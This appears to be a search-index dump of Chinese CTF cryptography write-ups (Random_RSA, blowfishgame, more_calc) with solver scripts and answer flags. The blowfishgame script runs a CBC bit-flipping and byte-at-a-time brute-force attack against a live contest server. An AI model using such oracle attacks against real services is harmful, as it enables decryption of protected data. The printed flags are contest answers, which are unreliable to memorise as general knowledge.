2\u751f\u6210\u7684\u5217\u8868\u624d\u80fd\u5bf9\u5f97\u4e0a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7528python 2\u8dd1\u7a0b\u5e8f\uff0c\u5e76\u751f\u6210\u6b63\u786e\u7684\u6d41\u5bc6\u94a5\u3002\u7136\u540e\u5c31\u662f\u5f02\u6216\u5f97\u5230 \u3002 \u4e4b\u540e\u5c31\u662f\u6839\u636e \u679a\u4e3e \uff0c\u5c1d\u8bd5 \u662f\u5426\u4e0d\u4e3a1\u3002\u82e5\u662f\u7684\u8bdd\uff0c\u90a3\u8fd9\u4e2a\u503c\u5c31\u662f \u3002\u8fdb\u800c\u5f97\u5230 \u7684\u5206\u89e3\u5e76\u5bf9flag\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u3002\u5f97\u5230 \u7684\u4ee3\u7801\u5982\u4e0b\uff1a import random c2 = '[[58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]]' res2 = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81] seeds2 = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] c2 = eval(c2.replace('] [', '], [')) myc = [] for i in range(0, len(seeds2)): random.seed(seeds2[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) myc.append(rands[i % 4]) dp = [x ^ y for x, y in zip(myc, res2)] dp = int(bytearray(dp)) print(dp) \u5f97\u5230 \u7684\u5206\u89e3\u8fdb\u800c\u89e3\u5bc6 \u7684\u4ee3\u7801\u5982\u4e0b\uff1a from Crypto.Util.number import * n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391 ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 e=0x10001 for k in range(1, 100000): p = (e * dp - 1) // k + 1 if (n % p == 0): break q = n // p d = inverse(e, (p-1)*(q-1)) m = pow(ct, d, n) print(long_to_bytes(m)) Flag flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} Reference Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Random_RSA"},{"location":"Writeup/Cryptography/Random_RSA/#random_rsa","text":"Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10","title":"Random_RSA"},{"location":"Writeup/Cryptography/Random_RSA/#description","text":"\u4e00\u628a\u68ad\uff0c\u597d\u50cf\u4e0d\u884c\u54e6\u3002 Random_RSA.zip","title":"Description"},{"location":"Writeup/Cryptography/Random_RSA/#_1","text":"\u9898\u76ee\u57fa\u4e8eRSA\uff0c \u3002\u9898\u76ee\u7ed9\u51faflag\u52a0\u5bc6\u7684\u5bc6\u6587 \u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u5173\u4e8e \u7684\u63d0\u793a\uff1a\u9898\u76ee\u7ed9\u4e86\u968f\u673a\u79cd\u5b50\u5217\u8868\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u968f\u673a\u79cd\u5b50\uff0c\u9898\u76ee\u4f1a\u57fa\u4e8e\u8fd9\u4e2a\u968f\u673a\u79cd\u5b50\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5217\u8868\uff0c\u6bcf\u6b21\u90fd\u4ece\u5217\u8868\u91cc\u9762\u6307\u5b9a\u4f4d\u7f6e\u62a0\u6389\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u7ed9\u51fa\u5176\u4ed6\u6570\u7ec4\u6210\u7684\u5217\u8868\uff1b\u7528\u88ab\u62a0\u6389\u90a3\u4e2a\u6570\u4f5c\u4e3a\u6d41\u5bc6\u94a5\uff0c\u4e0e \u7684\u5341\u8fdb\u5236\u8868\u793a\u5b57\u7b26\u4e32\u5bf9\u5e94\u5b57\u8282\u8fdb\u884c\u5f02\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u5bc6\u6587\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/Cryptography/Random_RSA/#_2","text":"\u9996\u5148\u6211\u4eec\u5148\u5c1d\u8bd5\u641e\u51fa \uff1a\u6211\u4eec\u901a\u8fc7\u8bbe\u968f\u673a\u79cd\u5b50\uff0c\u5f97\u5230\u5217\u8868\u3002\u53d1\u73b0\u53ea\u6709python 2\u751f\u6210\u7684\u5217\u8868\u624d\u80fd\u5bf9\u5f97\u4e0a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7528python 2\u8dd1\u7a0b\u5e8f\uff0c\u5e76\u751f\u6210\u6b63\u786e\u7684\u6d41\u5bc6\u94a5\u3002\u7136\u540e\u5c31\u662f\u5f02\u6216\u5f97\u5230 \u3002 \u4e4b\u540e\u5c31\u662f\u6839\u636e \u679a\u4e3e \uff0c\u5c1d\u8bd5 \u662f\u5426\u4e0d\u4e3a1\u3002\u82e5\u662f\u7684\u8bdd\uff0c\u90a3\u8fd9\u4e2a\u503c\u5c31\u662f \u3002\u8fdb\u800c\u5f97\u5230 \u7684\u5206\u89e3\u5e76\u5bf9flag\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u3002\u5f97\u5230 \u7684\u4ee3\u7801\u5982\u4e0b\uff1a import random c2 = '[[58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]]' res2 = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81] seeds2 = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] c2 = eval(c2.replace('] [', '], [')) myc = [] for i in range(0, len(seeds2)): random.seed(seeds2[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) myc.append(rands[i % 4]) dp = [x ^ y for x, y in zip(myc, res2)] dp = int(bytearray(dp)) print(dp) \u5f97\u5230 \u7684\u5206\u89e3\u8fdb\u800c\u89e3\u5bc6 \u7684\u4ee3\u7801\u5982\u4e0b\uff1a from Crypto.Util.number import * n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391 ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 e=0x10001 for k in range(1, 100000): p = (e * dp - 1) // k + 1 if (n % p == 0): break q = n // p d = inverse(e, (p-1)*(q-1)) m = pow(ct, d, n) print(long_to_bytes(m))","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/Cryptography/Random_RSA/#flag","text":"flag{74281db3-c6f0-e59a-4da6-39b8c71250fe}","title":"Flag"},{"location":"Writeup/Cryptography/Random_RSA/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Reference"},{"location":"Writeup/Cryptography/blowfishgame/","text":"blowfishgame Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 35 Description Solution CBC \u7ffb\u8f6c\u653b\u51fb\u4f7f message \u524d 8 \u5b57\u8282\u4e3a get_flag\uff0c\u7136\u540e\u5c31\u662f\u7b80\u5355\u7684\u9010\u5b57\u8282\u7206\u7834\uff0c\u6211\u5168\u90fd\u9632\u51fa\u53bb\u4e86\uff0c\u9632\u51fa\u53bb\u4e86\u554a\u3002 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Nonuplebroken <birkenwald.cn> # @Date : 2020-11-22 from pwn import * import string import itertools from hashlib import sha384 import re import base64 def PoW(part, hash_value): alphabet = string.ascii_letters + string.digits for x in itertools.product(alphabet, repeat=3): nonce = ''.join(x) if sha384(nonce + part).hexdigest() == hash_value: return nonce def xor(a, b): assert len(a) == len(b) return ''.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))]) sh = remote('8.131.69.237', 15846) s1 = sh.recvuntil('Give me XXX:') re_res = re.search(r'sha384\\(XXX\\+([a-zA-Z0-9]{17})\\) == ([0-9a-f]{96})', s1) part = re_res.group(1) hash_value = re_res.group(2) print 'part:', part print 'hash_value:', hash_value nonce = PoW(part, hash_value) print 'nonce:', nonce sh.sendline(nonce) _ = [sh.recvline() for i in range(8)] s1 = sh.recvline() s1 = base64.b64decode(s1) iv, c = s1[:8], s1[8:] print len(iv) print len(c) d_c1 = xor('Blowfish', iv) new_iv = xor(d_c1, 'get_flag') get_flag = base64.b64encode(new_iv + c) print get_flag flag = '' alphabet = 'flag{}-0123456789abcdef' # alphabet = string.printable for i in range(42): sh.sendline(get_flag) target_m = ('x' * (47 - i)) sh.sendline(target_m) target_c = base64.b64decode(sh.recvline()) for x in alphabet: sh.sendline(get_flag) test_m = ('x' * (47 - i)) + flag + x sh.sendline(test_m) test_c = base64.b64decode(sh.recvline()) if test_c[:48] == target_c[:48]: flag += x print '[%02d/42] %s' % (i+1, flag) break sh.interactive() Flag flag{ba524422-7769-4d00-bd4d-6d6946c173ce} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"blowfishgame"},{"location":"Writeup/Cryptography/blowfishgame/#blowfishgame","text":"Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 35","title":"blowfishgame"},{"location":"Writeup/Cryptography/blowfishgame/#description","text":"","title":"Description"},{"location":"Writeup/Cryptography/blowfishgame/#solution","text":"CBC \u7ffb\u8f6c\u653b\u51fb\u4f7f message \u524d 8 \u5b57\u8282\u4e3a get_flag\uff0c\u7136\u540e\u5c31\u662f\u7b80\u5355\u7684\u9010\u5b57\u8282\u7206\u7834\uff0c\u6211\u5168\u90fd\u9632\u51fa\u53bb\u4e86\uff0c\u9632\u51fa\u53bb\u4e86\u554a\u3002 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Nonuplebroken <birkenwald.cn> # @Date : 2020-11-22 from pwn import * import string import itertools from hashlib import sha384 import re import base64 def PoW(part, hash_value): alphabet = string.ascii_letters + string.digits for x in itertools.product(alphabet, repeat=3): nonce = ''.join(x) if sha384(nonce + part).hexdigest() == hash_value: return nonce def xor(a, b): assert len(a) == len(b) return ''.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))]) sh = remote('8.131.69.237', 15846) s1 = sh.recvuntil('Give me XXX:') re_res = re.search(r'sha384\\(XXX\\+([a-zA-Z0-9]{17})\\) == ([0-9a-f]{96})', s1) part = re_res.group(1) hash_value = re_res.group(2) print 'part:', part print 'hash_value:', hash_value nonce = PoW(part, hash_value) print 'nonce:', nonce sh.sendline(nonce) _ = [sh.recvline() for i in range(8)] s1 = sh.recvline() s1 = base64.b64decode(s1) iv, c = s1[:8], s1[8:] print len(iv) print len(c) d_c1 = xor('Blowfish', iv) new_iv = xor(d_c1, 'get_flag') get_flag = base64.b64encode(new_iv + c) print get_flag flag = '' alphabet = 'flag{}-0123456789abcdef' # alphabet = string.printable for i in range(42): sh.sendline(get_flag) target_m = ('x' * (47 - i)) sh.sendline(target_m) target_c = base64.b64decode(sh.recvline()) for x in alphabet: sh.sendline(get_flag) test_m = ('x' * (47 - i)) + flag + x sh.sendline(test_m) test_c = base64.b64decode(sh.recvline()) if test_c[:48] == target_c[:48]: flag += x print '[%02d/42] %s' % (i+1, flag) break sh.interactive()","title":"Solution"},{"location":"Writeup/Cryptography/blowfishgame/#flag","text":"flag{ba524422-7769-4d00-bd4d-6d6946c173ce}","title":"Flag"},{"location":"Writeup/Cryptography/blowfishgame/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Cryptography/more_calc/","text":"more_calc Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 25 Description maybe u need more cpu Solution import gmpy2 from Crypto.Util.number import * flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" p = getStrongPrime(2048) for i in range(1, (p+1)//2): s += pow(i, p-2, p) s = s % p q = gmpy2.next_prime(s) n = p*q e = 0x10001 c = pow(bytes_to_long(flag), e, n) print(p) print(c) #27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 #35055918683748883282174784323651813560520737603185800227424500428762264933021511381871995418539707283801414497303232960090541986190867832897131815320508500774326925395739528242032566313216102210036548100374594081897428098804503420454038574457280610255242042832626554192534670284369336699175346822030007088865173250252079700270724860427575514471342164997149244044205247072315311115645755855836214700200464613652201134426101746190195358346246762242881016710707928119020973125199597600335220176686188732073999025860155060600538887296782517962617671450347555788381054344555539001456268680189452831160062315698482986474322296387716709989292671747978922668181058489406663507675599642320338049377613048817085979874567772781052867215035033348050642450667612710852648837001109914769887507004392552421783737965416800917979813137835262317794775319294801257483177741372991005066875900770459644762548438474388076655842822437141772648037236281057239552272508379892613346840960049192531743799845858272389712078645821963027561694961956409973354276629777068204456160534409039477757097372521171307620184694243888389707840806777932547158990704118642378158004690358831695861544319681913385236756504946707671037639508589887549565323717819837942112908652 \u60f3\u6c42q\uff0c\u5f97\u5148\u6c42s\uff0c\u53c8\u56e0\u4e3as\u662f pow(i, p-2, p) \u7684\u7d2f\u548c( i \u4ece1\u5230 (p+1)//2 )\uff0c\u53ef\u4ee5\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6c42p \u548c (p+1)//2 -1 \u6c42\u9006\u5143 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Tr0jAn <Tr0jAn@birkenwald.cn> # @Date : 2020-11-22 import gmpy2 from Crypto.Util.number import long_to_bytes p = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 s = gmpy2.invert(p, (p+1)//2-1) s = s % p q = gmpy2.next_prime(s) e = 0x10001 phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) n = p*q c = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523 m = pow(c, d, n) print(long_to_bytes(m)) Flag flag{3d7f8da9-ee79-43c0-8535-6af524236ca1} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"more_calc"},{"location":"Writeup/Cryptography/more_calc/#more_calc","text":"Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 25","title":"more_calc"},{"location":"Writeup/Cryptography/more_calc/#description","text":"maybe u need more cpu","title":"Description"},{"location":"Writeup/Cryptography/more_calc/#solution","text":"import gmpy2 from Crypto.Util.number import * flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" p = getStrongPrime(2048) for i in range(1, (p+1)//2): s += pow(i, p-2, p) s = s % p q = gmpy2.next_prime(s) n = p*q e = 0x10001 c = pow(bytes_to_long(flag), e, n) print(p) print(c) #27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 #35055918683748883282174784323651813560520737603185800227424500428762264933021511381871995418539707283801414497303232960090541986190867832897131815320508500774326925395739528242032566313216102210036548100374594081897428098804503420454038574457280610255242042832626554192534670284369336699175346822030007088865173250252079700270724860427575514471342164997149244044205247072315311115645755855836214700200464613652201134426101746190195358346246762242881016710707928119020973125199597600335220176686188732073999025860155060600538887296782517962617671450347555788381054344555539001456268680189452831160062315698482986474322296387716709989292671747978922668181058489406663507675599642320338049377613048817085979874567772781052867215035033348050642450667612710852648837001109914769887507004392552421783737965416800917979813137835262317794775319294801257483177741372991005066875900770459644762548438474388076655842822437141772648037236281057239552272508379892613346840960049192531743799845858272389712078645821963027561694961956409973354276629777068204456160534409039477757097372521171307620184694243888389707840806777932547158990704118642378158004690358831695861544319681913385236756504946707671037639508589887549565323717819837942112908652 \u60f3\u6c42q\uff0c\u5f97\u5148\u6c42s\uff0c\u53c8\u56e0\u4e3as\u662f pow(i, p-2, p) \u7684\u7d2f\u548c( i \u4ece1\u5230 (p+1)//2 )\uff0c\u53ef\u4ee5\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6c42p \u548c (p+1)//2 -1 \u6c42\u9006\u5143 # -*- coding: utf-8 -*- # @Project: Hello Python! # @File : exp # @Author : Tr0jAn <Tr0jAn@birkenwald.cn> # @Date : 2020-11-22 import gmpy2 from Crypto.Util.number import long_to_bytes p = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 s = gmpy2.invert(p, (p+1)//2-1) s = s % p q = gmpy2.next_prime(s) e = 0x10001 phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) n = p*q c = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523 m = pow(c, d, n) print(long_to_bytes(m))","title":"Solution"},{"location":"Writeup/Cryptography/more_calc/#flag","text":"flag{3d7f8da9-ee79-43c0-8535-6af524236ca1}","title":"Flag"},{"location":"Writeup/Cryptography/more_calc/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Cryptography/myRSA/","text":"myRSA Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15 Description \u6211\u7684\u7b2c\u4e00\u6b21\u5bc6\u7801\u5b66\u5bfc\u8bba\u4f5c\u4e1a, \u53c2\u6570\u7684\u751f\u6210\u5927\u5bb6\u89c9\u5f97\u600e\u6837\u5462\uff1f nc 